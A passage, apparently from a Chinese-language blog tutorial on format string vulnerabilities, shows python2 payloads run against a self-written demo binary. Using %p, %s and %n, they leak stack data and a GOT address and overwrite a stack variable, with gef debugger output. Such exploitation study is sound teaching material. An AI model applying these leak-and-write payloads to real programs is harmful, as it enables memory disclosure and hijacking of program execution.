&#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\x20\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x401200..0x7ffff7fa72e8.</span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\xf0\x3f\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x403ff0..0x7ffff7fa7200.�?@</span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\x18\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x404018..0x7ffff7fa7200.@@</span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\x28\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x404028..0x7ffff7fa7200.(@@</span><br></pre></td></tr></table></figure><p>细心一点你就会发现第一个（<code>printf</code>）的结果有问题。我们输入了 <code>\x20\x40\x40\x00\x00\x00\x00\x00</code>（<code>0x000000404020</code>），可是 21 号位置输出的结果却是 <code>0x401200</code>，那么，<code>\20</code> 哪去了？</p><p>查了一下 ASCII 表，发现 <code>\x0C</code> (’\f’)、<code>\x07</code>（’\a’）、<code>\x08</code>（’\b’）、<code>\x20</code>（SPACE）等的不可见字符都会被省略。这就会让我们后续的操作出现问题。所以这里我们选用最后一个（<code>__isoc99_scanf</code>）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$p&quot;+&quot;\x28\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAAAA.0x404028(@@</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$s&quot;+&quot;\x28\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAAAA.�����(@@</span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$p&quot;+&quot;\x28\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27;&gt;text</span><br><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">gef➤  b printf</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  <span class="string">&quot;AAAAAAAAAA.%10<span class="variable">$p</span>(@@&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: &quot;AAAAAAAAAA.%10$p(@@&quot; ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: &quot;AA.%10$p(@@&quot;</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x0000000000404028  →  0x00007ffff7e190b0  →  &lt;__isoc99_scanf+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/g 0x0000000000404028</span><br><span class="line">0x404028 &lt;__isoc99_scanf@got.plt&gt;:0x7ffff7e190b0</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAAAA.0x404028(@@</span><br><span class="line">[Inferior 1 (process 23800) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>虽然我们可以通过 <code>x/w</code> 指令得到 <code>__isoc99_scanf</code> 函数的虚拟地址 <code>0x7ffff7e190b0</code>。但是由于 <code>0x0000000000404028</code> 处的内容是仍然一个指针，使用 <code>%10$s</code> 打印并不成功。</p><h4 id="224-栈数据覆盖"><a class="markdownIt-Anchor" href="#224-栈数据覆盖"></a> 2.2.4 栈数据覆盖</h4><p>现在我们已经可以读取栈上和任意地址的内存了，接下来我们更进一步，通过修改栈和内存来劫持程序的执行流程。<code>%n</code> 转换指示符将 <code>%n</code> 当前已经成功写入流或缓冲区中的字符个数存储到地址由参数指定的整数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//coverStack.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %n\n&quot;</span>, str, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ ./coverStack </span><br><span class="line">hello </span><br><span class="line">6</span><br></pre></td></tr></table></figure><p><code>i</code> 被赋值为 6，因为在遇到转换指示符之前一共写入了 6 个字符（<code>hello</code> 加上一个&quot;\0&quot;）。在没有长度修饰符时，默认写入一个 <code>int</code> 类型的值。</p><p>通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数，即在格式字符串中加上一个十进制整数来表示输出的最小位数，如果实际位数大于定义的宽度，则按实际位数输出，反之则以空格或 0 补齐（<code>0</code> 补齐时在宽度前加点<code>.</code> 或 <code>0</code>）。如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//coverStack.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%10u%n\n&quot;</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.50u%n\n&quot;</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%0100u%n\n&quot;</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ ./coverStack </span><br><span class="line">         <span class="number">1</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">00000000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure><p>还是我们在 <code>2.2.2 栈数据泄露</code> 中使用的程序，我们尝试将 <code>arg4</code> 的值更改为任意值（比如 <code>0x00000040</code>，十进制 64），在 gdb 中可以看到得到 <code>arg4</code> 的地址 <code>0x00007fffffffded6</code>，那么我们构造格式字符串 <code>%016x%016x%032d%9$n\xd6\xde\xff\xff\xff\x7f\x00\x00</code>。<br>\1. <code>%016x%016x</code> 表示两个 32 字符宽的十六进制数，占 16 字节。<br>\2. <code>%032d</code> 占 32 字节，三个部分加起来就占了 16+16+32=64 字节，即把 <code>arg4</code> 赋值为 <code>0x00000040</code>。<br>\3. <code>\xd6\xde\xff\xff\xff\x7f\x00\x00</code> 表示 <code>arg4</code> 的地址，由于在 <code>%n</code> 后面所以不被计入。<br>\4. 格式字符串最后一部分 <code>%9$n</code> 也是最重要的一部分，由于 <code>\x00</code> 字符截断的原因，我们需要把 <code>arg4</code> 的地址放在最后。所以它的偏移可能不是 <code>8</code>，还需要我们进一步调试，这里暂且先用<code>偏移 8</code> 来解释。 <code>%9$n</code> 和上面的内容一样，表示格式字符串的第 9 个参数，即写入 <code>\xd6\xde\xff\xff\xff\x7f\x00\x00</code> 的地方，<code>printf()</code> 就是通过这个地址找到被覆盖的内容的。</p><p>首先，为了确定 arg4 在栈中的偏移，传入参数：<code>%016x.%016x.%022d.%11$p.\xd6\xde\xff\xff\xff\x7f\x00\x00</code> 用以区分出地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x.%016x.%022d.%11$p.\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">gef➤  b printf</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x30252e7836313025 (<span class="string">&quot;%016x.%0&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x30252e7836313025 ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x323230252e783631</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x2e70243131252e64</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x00007fffffffded6  →  &quot;ABCDEFGH&quot;</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0000000000000001.0000000088888888.-000000000000000000001.0x7fffffffded6.�����</span><br><span class="line">[Inferior 1 (process 24935) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>经过不断调试，最终我们找到了我们写入的参数的位置 <code>偏移：10</code>，接下来就是写入了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x%016x%032d%11$n.\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">Reading symbols from fmtdemo...</span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">88 commands loaded and 5 functions added for GDB 9.1 in 0.01ms using Python engine 3.8</span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo &lt; text</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x3130257836313025 (<span class="string">&quot;%016x%01&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x3130257836313025 ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x2564323330257836</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0xffded62e6e243131</span><br><span 